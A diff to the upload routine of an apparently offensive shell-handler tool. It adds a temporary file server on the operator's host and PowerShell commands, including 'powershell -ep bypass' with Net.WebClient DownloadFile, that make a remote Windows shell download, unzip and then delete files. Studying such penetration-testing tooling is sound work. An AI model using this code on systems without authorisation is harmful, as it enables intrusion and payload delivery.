@@ -3793,18 +3793,18 @@ class Session:
 							myzip.write(item, arcname=altname)
 					altnames.append(altname)
 
-			# Base64 encode the zip and transfer through the shell
 			zip_buffer.seek(0)
-			b64data = base64.b64encode(zip_buffer.read()).decode()
+			zip_data = zip_buffer.read()
+			b64data = base64.b64encode(zip_data).decode()
 			temp_zip = f"{self.tmp}\\{rand(10)}.zip"
+			dst_ps = destination.replace("'", "''")
 
-			logger.info(paint(f"Transferring {len(b64data)} bytes (base64) through shell...").blue)
+			# Small payload — inline base64 through the shell (no extra port)
+			if (self.subtype == 'psh' and len(b64data) <= 100000) or \
+			   (self.subtype != 'psh' and len(b64data) <= 7000):
 
-			# Limit for inline PowerShell: ~7000 chars leaves room for the
-			# rest of the command within cmd.exe's 8191-char line limit
-			if len(b64data) <= 7000:
-				# Small payload — single inline PowerShell command
-				dst_ps = destination.replace("'", "''")
+				logger.info(paint(f"Transferring {len(b64data)} bytes (base64) inline...").blue)
+
 				if self.subtype == 'psh':
 					ps_cmd = (
 						f"$b = [Convert]::FromBase64String('{b64data}'); "
@@ -3826,61 +3826,49 @@ class Session:
 						f'"'
 					)
 				response = self.exec(ps_cmd, value=True, timeout=None)
+
 			else:
-				# Large payload — write base64 chunks to a file, then extract
-				temp_b64 = f"{self.tmp}\\{rand(10)}.b64"
-				chunk_size = 4000
+				# Large payload — FileServer + PowerShell download (no certutil)
+				with ExitStack() as stack:
+					server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
+					server.start()
+					stack.callback(lambda: server.term.wait(options.short_timeout))
+					stack.callback(lambda: server.stop())
+					server.init.wait(options.short_timeout)
 
-				if self.subtype == 'psh':
-					# PowerShell shell: use Add-Content directly
-					first = True
-					for chunk in chunks(b64data, chunk_size):
-						if first:
-							response = self.exec(
-								f"Set-Content -Path '{temp_b64}' -Value '{chunk}' -NoNewline",
-							)
-							first = False
-						else:
-							response = self.exec(
-								f"Add-Content -Path '{temp_b64}' -Value '{chunk}' -NoNewline",
-							)
-						if response is False:
-							logger.error("Upload interrupted during data transfer")
-							self.exec(f"Remove-Item '{temp_b64}' -Force -ErrorAction SilentlyContinue")
-							return []
-				else:
-					# CMD shell: use echo >> (no force_cmd quoting issue)
-					for chunk in chunks(b64data, chunk_size):
-						response = self.exec(f'echo {chunk}>>"{temp_b64}"')
-						if response is False:
-							logger.error("Upload interrupted during data transfer")
-							self.exec(f'del "{temp_b64}" 2>nul')
-							return []
+					if not hasattr(server, 'id'):
+						logger.error("Failed to start file server for upload")
+						return []
 
-				dst_ps = destination.replace("'", "''")
-				if self.subtype == 'psh':
-					ps_cmd = (
-						f"$b64 = (Get-Content -Raw '{temp_b64}') -replace '\\s'; "
-						f"[IO.File]::WriteAllBytes('{temp_zip}', "
-						f"[Convert]::FromBase64String($b64)); "
-						f"Expand-Archive -Path '{temp_zip}' "
-						f"-DestinationPath '{dst_ps}' -Force; "
-						f"Remove-Item '{temp_b64}', '{temp_zip}' -Force; "
-						f"echo EXTRACT_OK"
-					)
-				else:
-					ps_cmd = (
-						f'powershell -ep bypass -c "'
-						f"$b64 = (Get-Content -Raw '{temp_b64}') -replace '\\s'; "
-						f"[IO.File]::WriteAllBytes('{temp_zip}', "
-						f"[Convert]::FromBase64String($b64)); "
-						f"Expand-Archive -Path '{temp_zip}' "
-						f"-DestinationPath '{dst_ps}' -Force; "
-						f"Remove-Item '{temp_b64}', '{temp_zip}' -Force; "
-						f"echo EXTRACT_OK"
-						f'"'
-					)
-				response = self.exec(ps_cmd, value=True, timeout=None)
+					# Write zip to temp file and serve it
+					tempfile_zip = f'/dev/shm/{rand(16)}.zip'
+					stack.callback(lambda p=tempfile_zip: os.path.exists(p) and os.remove(p))
+					with open(tempfile_zip, 'wb') as f:
+						f.write(zip_data)
+					urlpath_zip = server.add(tempfile_zip)
+
+					url = f"http://{self._host}:{server.port}{urlpath_zip}"
+					logger.info(paint(f"Downloading {len(zip_data):,} bytes via {url}").blue)
+
+					if self.subtype == 'psh':
+						dl_cmd = (
+							f"(New-Object Net.WebClient).DownloadFile('{url}', '{temp_zip}'); "
+							f"Expand-Archive -Path '{temp_zip}' "
+							f"-DestinationPath '{dst_ps}' -Force; "
+							f"Remove-Item '{temp_zip}' -Force; "
+							f"echo EXTRACT_OK"
+						)
+					else:
+						dl_cmd = (
+							f'powershell -ep bypass -c "'
+							f"(New-Object Net.WebClient).DownloadFile('{url}', '{temp_zip}'); "
+							f"Expand-Archive -Path '{temp_zip}' "
+							f"-DestinationPath '{dst_ps}' -Force; "
+							f"Remove-Item '{temp_zip}' -Force; "
+							f"echo EXTRACT_OK"
+							f'"'
+						)
+					response = self.exec(dl_cmd, value=True, timeout=None)
 
 			if not response or 'EXTRACT_OK' not in response:
 				logger.error(f"Extraction failed: {response}")
